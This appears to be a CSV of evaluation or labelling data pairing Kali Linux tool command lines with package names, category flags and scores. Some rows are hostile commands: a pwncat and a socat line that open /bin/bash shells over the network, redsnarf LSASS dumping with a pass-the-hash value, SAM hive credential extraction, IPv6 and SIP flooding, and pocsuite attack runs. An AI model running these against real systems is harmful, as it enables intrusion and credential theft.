custom_id,gt_cmd,matched_key,title,metapackages,total_score,kali-tools-information-gathering,kali-tools-802-11,kali-tools-rfid,kali-tools-bluetooth,kali-tools-sdr,kali-tools-social-engineering,kali-tools-vulnerability,kali-tools-fuzzing,kali-tools-web,kali-tools-database,kali-tools-voip,kali-tools-exploitation,kali-tools-sniffing-spoofing,kali-tools-hardware,kali-tools-wireless,kali-tools-post-exploitation,kali-tools-passwords,kali-tools-windows-resources,kali-tools-crypto-stego,kali-tools-reverse-engineering,kali-tools-forensics,kali-tools-reporting,kali-tools-gpu
row-462,wig-ng --verbose --verbose --R /pcaps/,wig,wig,,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-463,qemu-microblaze-static --B 0x10000000 --R 268435456 test.elf,qemu,qemu,kali-tools-hardware,0.08333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
row-464,qemu-microblaze-static --L /lib/microblaze --seed 42 firmware,qemu,qemu,kali-tools-hardware,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
row-465,qemu-microblaze-static --g 5678 --jitdump kernel.elf,qemu,qemu,kali-tools-hardware,0.13333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
row-466,"qemu-microblaze-static --E VAR1=valA,VAR2=valB --U LD_DEBUG --version main",qemu,qemu,kali-tools-hardware,0.4444444444444445,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
row-467,pwncat --exec /bin/bash 192.168.1.10 4444,pwncat,pwncat,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-468,"pwncat --banner --udp -z 10.0.0.5 80,443,8080",pwncat,pwncat,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-469,pwncat --header 'User-Agent: test' --header 'X-Forwarded-For: 1.2.3.4' --http example.com 80,pwncat,pwncat,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-470,pwncat --rebind --rebind-robin 5353-5355 -u -l 5353,pwncat,pwncat,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-471,spectool_curses --list,spectool_curses,spectools,kali-tools-wireless,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-472,spectool_net --bindaddr 10.0.0.5 --broadcast 15,spectool_net,spectools,kali-tools-wireless,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-473,spectool_net --broadcast 60 --range acme_rf0:5725-5850,spectool_net,spectools,kali-tools-wireless,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-474,above --interface eth0 --output discovery.pcap --passive-arp --timer 60,above,above,kali-tools-sniffing-spoofing,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
row-475,above --interface enp0s3 --search-vlan --timer 300,above,above,kali-tools-sniffing-spoofing,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
row-476,dislocker-bek --file secure_volume.bek,dislocker,dislocker,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-477,dislocker-find image1.bin image2.bin image3.bin,dislocker,dislocker,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-478,dislocker-find /dev/nvme0n1p3 /dev/sdb2,dislocker-find,dislocker,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-479,mkimage -l uImage,mkimage,u-boot,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-480,mkimage -A arm -O linux -T kernel -C gzip -a 0x80008000 -e 0x80008000 -n 'Linux Kernel' -d vmlinux.bin uImage,mkimage,u-boot,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-481,mkimage -f fit.its -b dtb1.dtb -b dtb2.dtb fit-image,mkimage,u-boot,,0.6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-482,mkimage -V,mkimage,u-boot,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-483,dislocker-fuse --force-block 2 --fvek fvek.bin --quiet --volume /dev/sda5 -- /tmp/fvek_mount,dislocker,dislocker,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-484,mkimage -F -k /keys -r firmware.fit,mkimage,u-boot,,0.11111111111111112,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-485,dislocker-metadata --help,dislocker,dislocker,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-486,shellfire --help,shellfire,shellfire,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-487,bytecode-viewer --help,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-488,powershell-empire server,powershell,powershell,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-489,cherrytree --version,cherrytree,cherrytree,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-490,maltego --fontsize 14 --nosplash,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-491,affcompare -b file1.aff file2.aff,affcompare,afflib,kali-tools-forensics,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-492,maltego --cachedir /tmp/maltego_cache --userdir /tmp/maltego_user,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-493,maltego --locale en_US --v3ProtocolDisabled,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-494,maltego --reload /opt/modules/custom.jar,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-495,affcompare -a -m -r data/ backup/,affcompare,afflib,kali-tools-forensics,0.8333333333333334,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-496,maltego --hub https://hub.maltego.com --laf com.example.DarkTheme,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-497,maltego --cloud prod --machine server01 --updates /updates/,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-498,maltego --fontsize 12 --locale fr_FR --open target1.mtz target2.mtz,maltego,maltego,"kali-tools-information-gathering,kali-tools-reporting,kali-tools-social-engineering,kali-tools-web",0.3333333333333333,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0
row-499,affsegment -c data.aff,affsegment,afflib,kali-tools-forensics,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-500,redsnarf --domain_name EXAMPLE --host ip=10.0.0.5 --lsass_dump y --password SecretPass --username admin,redsnarf,redsnarf,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-501,redsnarf --get_spn y --host ip=192.168.50.100 --password aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --username svc_account,redsnarf,redsnarf,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-502,affsign -c public_cert.cer -k secret.key -n case_file.aff,affsign,afflib,kali-tools-forensics,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-503,affxml -V,affxml,afflib,kali-tools-forensics,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-504,koadic --autorun /root/init.koadic,koadic,koadic,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-505,rctest -a -A -E -Y 5 hci0,rctest,bluez,"kali-tools-bluetooth,kali-tools-rfid,kali-tools-wireless",0.8888888888888888,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-506,rctest -d -L 30 -O dump.pcap 11:22:33:44:55:66,rctest,bluez,"kali-tools-bluetooth,kali-tools-rfid,kali-tools-wireless",0.6888888888888888,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-507,myrescue-stat status.bitmap,myrescue,myrescue,kali-tools-forensics,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-508,rctest -s -N 100 -C 10 -D 500 99:88:77:66:55:44,rctest,bluez,"kali-tools-bluetooth,kali-tools-rfid,kali-tools-wireless",0.8571428571428572,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-509,rctest -m -B packets.dat -S 01:02:03:04:05:06,rctest,bluez,"kali-tools-bluetooth,kali-tools-rfid,kali-tools-wireless",0.5555555555555555,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-510,rctest -w -B payload.bin -E -Y 3 DE:AD:BE:EF:CA:FE,rctest,bluez,"kali-tools-bluetooth,kali-tools-rfid,kali-tools-wireless",0.5833333333333334,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-511,creddump7 /mnt/win/SAM /mnt/win/SYSTEM,creddump7,creddump7,"kali-tools-forensics,kali-tools-passwords",0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0
row-512,creddump7 /artifacts/SAM.bak /artifacts/SYSTEM.bak,creddump7,creddump7,"kali-tools-forensics,kali-tools-passwords",0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0
row-513,hackrf_transfer -f 2400000000 -r capture.raw -s 10000000,hackrf_transfer,hackrf,"kali-tools-sdr,kali-tools-wireless",0.9333333333333332,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-514,feroxbuster --filter-status 404 --filter-status 403 --threads 100 --url http://test.local,feroxbuster,feroxbuster,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-515,feroxbuster --extensions .php --extensions .js --extensions .json --url http://api.example.org --user-agent CustomScanner/1.0,feroxbuster,feroxbuster,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-516,feroxbuster --thorough --url https://web.target,feroxbuster,feroxbuster,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-517,feroxbuster --collect-words --json --output findings.json --url http://shop.local,feroxbuster,feroxbuster,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-518,gparted /dev/sda /dev/sdb,gparted,gparted,kali-tools-forensics,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-519,mfoc -O dump.mfd,mfoc,mfoc,"kali-tools-rfid,kali-tools-wireless",0.3333333333333333,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-520,mfoc -k 112233445566 -O clone.mfd,mfoc,mfoc,"kali-tools-rfid,kali-tools-wireless",0.3333333333333333,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0
row-521,sha256deep --bare --recursive --size /evidence,sha256deep,hashdeep,kali-tools-forensics,0.9333333333333332,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-522,whirlpooldeep -z -r .,whirlpooldeep,hashdeep,kali-tools-forensics,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-523,hashdeep -l -p 1M -r /evidence,hashdeep,hashdeep,kali-tools-forensics,0.9333333333333332,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-524,macchanger --show eth0,macchanger,macchanger,"kali-tools-802-11,kali-tools-sniffing-spoofing,kali-tools-wireless",0.3333333333333333,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0
row-525,exploitdb-bin-sploit --help,exploitdb,exploitdb,kali-tools-exploitation,1.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0
row-526,axel --max-speed 1024 --num-connections 5 https://example.com/file.iso,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-527,watobo --help,watobo,watobo,kali-tools-web,1.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-528,axel --no-clobber --output local_data.zip https://example.org/data.zip,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-529,axel --insecure --ipv4 --timeout 30 https://mirror.example.net/file.tar.gz,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-530,axel --header 'Authorization: Bearer token123' --user-agent 'CustomBot/1.0' https://cdn.example.com/app.deb,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-531,axel --no-proxy --percentage https://secure.example.com/document.pdf,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-532,axel --no-clobber --timeout 45 https://example.net/update.pkg,axel,axel,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-533,undbx --recover --verbosity 2 inbox.dbx output/,undbx,undbx,kali-tools-forensics,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
row-534,recon-cli --stealth -m recon/domains-hosts/bing_domain_web -x,,,,0.8888888888888888,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-535,recon-cli -G -g SOURCE=test.com -w project_alpha,,,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-536,recon-cli --stealth -M -w pentest_2024,,,,0.7777777777777777,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-537,sublist3r --domain kali.org --engines bing --threads 3,sublist3r,sublist3r,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-538,hping3 --traceroute --verbose -1 www.example.com,hping3,hping3,"kali-tools-information-gathering,kali-tools-vulnerability",0.3333333333333333,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-539,addr6 --address 2001:db8::1 --print-canonic,addr6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-540,addr6 --stdin --print-reverse --print-stats --block-dup,addr6,ipv6-toolkit,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-541,addr6 --address fe80::1 --print-decode --verbose,addr6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-542,blackhole6 --help,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-543,flow6 --dst-addr 2001:db8::1 --flow-label-policy --interface eth0,flow6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-544,radsniff --interface wlan0 --filter 'udp port 1812' --stdout-pcap,radsniff,freeradius,,0.1111111111111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-545,icmp6 --dst-addr 2001:db8::1 --icmp6-dest-unreach 1 --interface eth0 --src-addr 2001:db8::2,icmp6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-546,radtest --protocol tcp --type chap --ipv6 bob password radius.example.com 10 sharedkey,radtest,freeradius,,0.8148148148148149,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-547,radzap --help,radzap,freeradius,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-548,radzap --nas-ip-address 10.5.5.5 --nas-port 1813 --username-case-sensitive Iris,radzap,freeradius,,0.5238095238095238,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-549,mldq6 --add-slla-opt --dst-addr ff02::16 --interface eth0 --src-addr 2001:db8::1,mldq6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-550,onesixtyone --short 172.20.0.5 private,onesixtyone,onesixtyone,"kali-tools-information-gathering,kali-tools-passwords",0.6666666666666666,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0
row-551,na6 --dst-addr ff02::1 --interface eth0 --override --src-addr 2001:db8::1,na6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-552,sqldict --help,sqldict,sqldict,"kali-tools-database,kali-tools-passwords,kali-tools-web",1.0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0
row-553,na6 --interface wlan0 --listen,na6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-554,na6 --hbh-opt-hdr 16 --interface eth0 --router,na6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-555,ni6 --dst-addr 2001:db8::1 --hop-limit 64 --interface eth0 --subject-ipv6 2001:db8::1,ni6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-556,ns6 --flood-sources 150 --flood-targets 200 --interface eth0 --target-address 2001:db8:abcd::/64,ns6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-557,path6 --dst-addr 2001:db8::1 --flow-label random --verbose,path6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-558,ra6 --interface eth0 --src-addr 2001:db8::1 --managed,ra6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-559,ra6 --interface wlan0 --lifetime 1800 --reachable 30000 --retrans 1000,ra6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-560,ra6 --interface eth1 --flood-sources 50 --flood-prefixes 10,ra6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-561,ra6 --interface eth0 --loop --sleep 5 --preference high --home-agent,ra6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-562,rd6 --dst-addr 2001:db8::2 --interface eth0 --redir-dest 2001:db8::3/64 --redir-target 2001:db8::4/64 --src-addr 2001:db8::1,rd6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-563,rd6 --interface wlan0 --listen,rd6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-564,rs6 --add-slla-opt --dst-addr ff02::2 --interface eth0 --src-addr 2001:db8::1/64,rs6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-565,rs6 --flood-sources 100 --interface wlan0 --loop --sleep 5,rs6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-566,scan6 --interface eth0 --local-scan --verbose,scan6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-567,scan6 --dst-addr 2001:db8::/64 --probe-type echo --rand-src-addr,scan6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-568,afl-c++ -c -o fuzzer_target.o fuzzer_target.cpp,,,,0.6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-569,tcp6 --dst-addr 2001:db8::2 --src-addr 2001:db8::1 --dst-port 80 --src-port 12345 --tcp-flags SYN,tcp6,ipv6-toolkit,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-570,afl-clang -dM -E macros.c,,,,0.5555555555555555,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-571,afl-cc -MD -MF deps.d -c instrument.c,,,,0.4444444444444444,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-572,afl-clang++ -ffinite-math-only -funsafe-math-optimizations safe_math.cpp,,,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-573,procan --help,procan,socat,kali-tools-web,0.6666666666666666,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-574,afl-clang-lto -fPIC -fsanitize=address lib.c,,,,0.48888888888888893,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-575,"socat-chain.sh -V SSL-L:3000,reuseaddr,fork SOCKS::proxy.local:1080 OPENSSL:api.target:443,cafile=...",socat,socat,kali-tools-web,0.3333333333333333,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-576,"socat-mux.sh -V TCP4-L:8080,reuseaddr,fork TCP:192.168.1.10:80",socat,socat,kali-tools-web,0.3333333333333333,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-577,socat --experimental OPENSSL-LISTEN:8443 EXEC:/bin/bash,socat,socat,kali-tools-web,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-578,afl-g++ -E input.c,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-579,afl-g++ --save-temps --std c++17 app.cpp,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-580,afl-g++ --print-file-name libstdc++.so,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-581,afl-g++ --dumpmachine,,,,0.6666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-582,poc-console,,,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-583,pocsuite --output results.jsonl --url http://test.com/vuln.php?id=1 --verify -v 3,pocsuite,pocsuite3,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-584,pocsuite --attack --file urls.txt --threads 50 --timeout 15,pocsuite,pocsuite3,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-585,pocsuite --new -v 2,pocsuite,pocsuite3,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-586,pocsuite --file targets.txt --k wordpress --quiet,pocsuite,pocsuite3,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-587,pocsuite --attack --dork-zoomeye apache --max-page 5,pocsuite,pocsuite3,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-588,inviteflood eth0 5000 example.local 192.168.1.5 100,,,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-589,afl-plot --graphical /home/user/fuzz_state /home/user/plots,,,,1.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-590,nuclei --jsonl --output findings.jsonl --target example.com --templates http/cves/,nuclei,nuclei,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-591,nuclei --exclude-hosts 192.168.0.0/24 --list targets.txt --store-resp,nuclei,nuclei,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-592,nuclei --headless --show-browser --target example.com --templates headless/,nuclei,nuclei,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-593,nuclei --dast --debug-req --target example.com,nuclei,nuclei,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
row-594,nuclei --automatic-scan --output auto_scan.txt --target example.com,nuclei,nuclei,,0.3333333333333333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
